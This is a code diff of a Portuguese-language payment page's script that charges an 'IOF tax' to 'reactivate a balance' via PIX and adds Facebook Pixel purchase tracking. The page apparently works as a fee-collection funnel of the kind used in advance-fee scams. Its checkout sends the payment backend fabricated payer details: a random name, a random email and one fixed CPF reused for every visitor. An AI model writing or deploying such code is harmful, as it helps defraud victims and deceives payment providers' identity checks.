@@ -233,182 +233,190 @@
     });
   };
 </script>
-  <script>
-    // Funções para dados UTM
-    function obterParametrosUTM() {
-      const urlAtual = window.location.search;
-      const parametros = new URLSearchParams(urlAtual);
-      const utms = {};
-      const parametrosUTM = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
-      parametrosUTM.forEach(param => {
-        if (parametros.has(param)) {
-          utms[param] = parametros.get(param);
-        }
-      });
-      return utms;
+<script>
+  // Funções para dados UTM
+  function obterParametrosUTM() {
+    const urlAtual = window.location.search;
+    const parametros = new URLSearchParams(urlAtual);
+    const utms = {};
+    const parametrosUTM = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
+    parametrosUTM.forEach(param => {
+      if (parametros.has(param)) {
+        utms[param] = parametros.get(param);
+      }
+    });
+    return utms;
+  }
+  function adicionarUTMsURL(urlBase, utms) {
+    const url = new URL(urlBase);
+    const parametros = new URLSearchParams(url.search);
+    Object.keys(utms).forEach(key => {
+      parametros.set(key, utms[key]);
+    });
+    url.search = parametros.toString();
+    return url.toString();
+  }
+  // Funções para gerar dados aleatórios
+  function generateRandomCpf() {
+    return '45604973890';
+  }
+  function generateRandomEmail() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let name = '';
+    let domain = '';
+    for (let i = 0; i < 8; i++) name += chars.charAt(Math.floor(Math.random() * chars.length));
+    for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
+    return `${name}@${domain}.com`;
+  }
+  function generateRandomName() {
+    const firstNames = ["João", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
+    const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
+    const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+    const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+    return `${randomFirstName} ${randomLastName}`;
+  }
+  // Função para validar e formatar o número de WhatsApp
+  function validateAndFormatPhone(phone) {
+    const cleanedPhone = phone.replace(/\D/g, '');
+    const phoneRegex = /^([1-9]{2})(9[0-9]{7,8})$/;
+    if (!phoneRegex.test(cleanedPhone)) {
+      return null;
     }
-    function adicionarUTMsURL(urlBase, utms) {
-      const url = new URL(urlBase);
-      const parametros = new URLSearchParams(url.search);
-      Object.keys(utms).forEach(key => {
-        parametros.set(key, utms[key]);
-      });
-      url.search = parametros.toString();
-      return url.toString();
-    }
-    // Funções para gerar dados aleatórios
-    function generateRandomCpf() {
-      return '45604973890';
-    }
-    function generateRandomEmail() {
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      let name = '';
-      let domain = '';
-      for (let i = 0; i < 8; i++) name += chars.charAt(Math.floor(Math.random() * chars.length));
-      for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
-      return `${name}@${domain}.com`;
-    }
-    function generateRandomName() {
-      const firstNames = ["João", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
-      const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
-      const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
-      const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
-      return `${randomFirstName} ${randomLastName}`;
-    }
-    // Função para validar e formatar o número de WhatsApp
-    function validateAndFormatPhone(phone) {
-      const cleanedPhone = phone.replace(/\D/g, '');
-      const phoneRegex = /^([1-9]{2})(9[0-9]{7,8})$/;
-      if (!phoneRegex.test(cleanedPhone)) {
+    return cleanedPhone.substring(0, 12);
+  }
+  // Configurar o botão e validação do WhatsApp
+  document.addEventListener('DOMContentLoaded', function () {
+    const botaoPagar = document.getElementById('botaoPagar');
+    const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
+    const paymentCard = document.querySelector('.whatsapp-section');
+    const whatsappInput = document.getElementById('whatsappInput');
+    const whatsappError = document.querySelector('.whatsapp-error');
+    const paymentStatus = document.getElementById('paymentStatus');
+    const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');
+    const valorIOFcentavos = 2790; // Ajustado para R$ 27,90 (2790 centavos) para testes
+    const redirectUrl = 'https://reativasaldo.net/pagamentoiof2';
+    function validateWhatsAppInput() {
+      const phoneValue = whatsappInput.value.trim();
+      const formattedPhone = validateAndFormatPhone(phoneValue);
+      if (formattedPhone) {
+        whatsappError.classList.add('hidden');
+        botaoPagar.disabled = false;
+        return formattedPhone;
+      } else {
+        whatsappError.classList.remove('hidden');
+        botaoPagar.disabled = true;
         return null;
       }
-      return cleanedPhone.substring(0, 12);
     }
-    // Configurar o botão e validação do WhatsApp
-    document.addEventListener('DOMContentLoaded', function () {
-      const botaoPagar = document.getElementById('botaoPagar');
-      const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
-      const paymentCard = document.querySelector('.whatsapp-section');
-      const whatsappInput = document.getElementById('whatsappInput');
-      const whatsappError = document.querySelector('.whatsapp-error');
-      const paymentStatus = document.getElementById('paymentStatus');
-      const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');
-      const valorIOFcentavos = 2790; // Ajustado para R$ 27,90 (2790 centavos) para testes
-      const redirectUrl = 'https://reativasaldo.net/pagamentoiof2';
-      function validateWhatsAppInput() {
-        const phoneValue = whatsappInput.value.trim();
-        const formattedPhone = validateAndFormatPhone(phoneValue);
-        if (formattedPhone) {
-          whatsappError.classList.add('hidden');
-          botaoPagar.disabled = false;
-          return formattedPhone;
-        } else {
-          whatsappError.classList.remove('hidden');
-          botaoPagar.disabled = true;
-          return null;
-        }
-      }
-      whatsappInput.addEventListener('input', () => {
-        validateWhatsAppInput();
-      });
-      async function checkPaymentStatus(transactionId, statusElement) {
-        try {
-          const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
-            method: 'GET',
-            headers: { 'Content-Type': 'application/json' }
-          });
-          const data = await response.json();
-          if (response.ok && data.status) {
-            statusElement.style.display = 'block';
-            if (data.status === 'APPROVED') {
-              statusElement.textContent = 'Pagamento aprovado! Redirecionando...';
-              statusElement.classList.add('text-green-600');
-              const utms = obterParametrosUTM();
-              setTimeout(() => {
-                window.location.href = adicionarUTMsURL(redirectUrl, utms);
-              }, 2000);
-              return true;
-            } else if (data.status === 'PENDING') {
-              statusElement.textContent = 'Aguardando confirmação do pagamento...';
-            } else {
-              statusElement.textContent = 'Pagamento não aprovado. Tente novamente.';
-              statusElement.classList.remove('text-green-600');
-            }
+    whatsappInput.addEventListener('input', () => {
+      validateWhatsAppInput();
+    });
+    async function checkPaymentStatus(transactionId, statusElement) {
+      try {
+        const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
+          method: 'GET',
+          headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await response.json();
+        if (response.ok && data.status) {
+          statusElement.style.display = 'block';
+          if (data.status === 'APPROVED') {
+            statusElement.textContent = 'Pagamento aprovado! Redirecionando...';
+            statusElement.classList.add('text-green-600');
+            // Enviar evento de Purchase para o Facebook Pixel
+            fbq('track', 'Purchase', {
+              value: 27.90, // Valor do IOF em reais
+              currency: 'BRL',
+              content_name: 'Taxa de IOF',
+              content_type: 'product',
+              content_ids: ['IOF_TAX']
+            });
+            const utms = obterParametrosUTM();
+            setTimeout(() => {
+              window.location.href = adicionarUTMsURL(redirectUrl, utms);
+            }, 2000);
+            return true;
+          } else if (data.status === 'PENDING') {
+            statusElement.textContent = 'Aguardando confirmação do pagamento...';
           } else {
-            console.error('Erro ao verificar status do pagamento:', data);
-            statusElement.textContent = 'Erro ao verificar pagamento. Tente novamente.';
+            statusElement.textContent = 'Pagamento não aprovado. Tente novamente.';
             statusElement.classList.remove('text-green-600');
           }
-          return false;
-        } catch (error) {
-          console.error('Erro na requisição de status do pagamento:', error);
-          statusElement.textContent = 'Erro ao verificar pagamento. Verifique sua conexão.';
+        } else {
+          console.error('Erro ao verificar status do pagamento:', data);
+          statusElement.textContent = 'Erro ao verificar pagamento. Tente novamente.';
           statusElement.classList.remove('text-green-600');
-          return false;
         }
+        return false;
+      } catch (error) {
+        console.error('Erro na requisição de status do pagamento:', error);
+        statusElement.textContent = 'Erro ao verificar pagamento. Verifique sua conexão.';
+        statusElement.classList.remove('text-green-600');
+        return false;
       }
-      function startPaymentPolling(transactionId, statusElement) {
-        const interval = setInterval(async () => {
-          const isApproved = await checkPaymentStatus(transactionId, statusElement);
-          if (isApproved) {
-            clearInterval(interval);
+    }
+    function startPaymentPolling(transactionId, statusElement) {
+      const interval = setInterval(async () => {
+        const isApproved = await checkPaymentStatus(transactionId, statusElement);
+        if (isApproved) {
+          clearInterval(interval);
+        }
+      }, 5000);
+    }
+    botaoPagar.addEventListener('click', async function(event) {
+      event.preventDefault();
+      const formattedPhone = validateWhatsAppInput();
+      if (!formattedPhone) return;
+      const fixedCpf = generateRandomCpf();
+      const randomName = generateRandomName();
+      const randomEmail = generateRandomEmail();
+      const utms = obterParametrosUTM();
+      botaoPagar.textContent = 'Gerando PIX...';
+      botaoPagar.disabled = true;
+      const requestBody = {
+        name: randomName,
+        email: randomEmail,
+        cpf: fixedCpf,
+        phone: formattedPhone,
+        amount: valorIOFcentavos,
+        items: [
+          {
+            unitPrice: valorIOFcentavos,
+            title: "Taxa de IOF - Reativa Saldo (Teste)",
+            quantity: 1,
+            tangible: false
           }
-        }, 5000);
-      }
-      botaoPagar.addEventListener('click', async function(event) {
-        event.preventDefault();
-        const formattedPhone = validateWhatsAppInput();
-        if (!formattedPhone) return;
-        const fixedCpf = generateRandomCpf();
-        const randomName = generateRandomName();
-        const randomEmail = generateRandomEmail();
-        const utms = obterParametrosUTM();
-        botaoPagar.textContent = 'Gerando PIX...';
-        botaoPagar.disabled = true;
-        const requestBody = {
-          name: randomName,
-          email: randomEmail,
-          cpf: fixedCpf,
-          phone: formattedPhone,
-          amount: valorIOFcentavos,
-          items: [
-            {
-              unitPrice: valorIOFcentavos,
-              title: "Taxa de IOF - Reativa Saldo (Teste)",
-              quantity: 1,
-              tangible: false
-            }
-          ],
-          trackingParameters: utms
-        };
-        try {
-          console.log("🟢 Enviando dados para o backend:", requestBody);
-          const response = await fetch('/pagamentoiof/api/gerar-pix', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(requestBody)
-          });
-          const data = await response.json();
-          if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
-            paymentCard.style.display = 'none';
-            pixGeneratedContainer.style.display = 'block';
-            document.getElementById('pixQrCodeImg').src = data.pixQrCode;
-            document.getElementById('pixCodeTextarea').value = data.pixCode;
-            startPaymentPolling(data.transactionId, paymentStatusGenerated);
-          } else {
-            console.error('Erro retornado pelo backend ao gerar PIX:', data);
-            alert('Erro ao gerar PIX: ' + (data.message || 'Erro desconhecido. Por favor, tente novamente.'));
-            botaoPagar.textContent = 'Gerar Pix Agora';
-            botaoPagar.disabled = false;
-          }
-        } catch (error) {
-          console.error('Erro na requisição PIX:', error);
-          alert('Ocorreu um erro ao tentar gerar o PIX. Verifique sua conexão e tente novamente mais tarde.');
+        ],
+        trackingParameters: utms
+      };
+      try {
+        console.log("🟢 Enviando dados para o backend:", requestBody);
+        const response = await fetch('/pagamentoiof/api/gerar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(requestBody)
+        });
+        const data = await response.json();
+        if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
+          paymentCard.style.display = 'none';
+          pixGeneratedContainer.style.display = 'block';
+          document.getElementById('pixQrCodeImg').src = data.pixQrCode;
+          document.getElementById('pixCodeTextarea').value = data.pixCode;
+          startPaymentPolling(data.transactionId, paymentStatusGenerated);
+        } else {
+          console.error('Erro retornado pelo backend ao gerar PIX:', data);
+          alert('Erro ao gerar PIX: ' + (data.message || 'Erro desconhecido. Por favor, tente novamente.'));
           botaoPagar.textContent = 'Gerar Pix Agora';
           botaoPagar.disabled = false;
         }
-      });
+      } catch (error) {
+        console.error('Erro na requisição PIX:', error);
+        alert('Ocorreu um erro ao tentar gerar o PIX. Verifique sua conexão e tente novamente mais tarde.');
+        botaoPagar.textContent = 'Gerar Pix Agora';
+        botaoPagar.disabled = false;
+      }
     });
-  </script>
+  });
+</script>
 </body>
 </html>
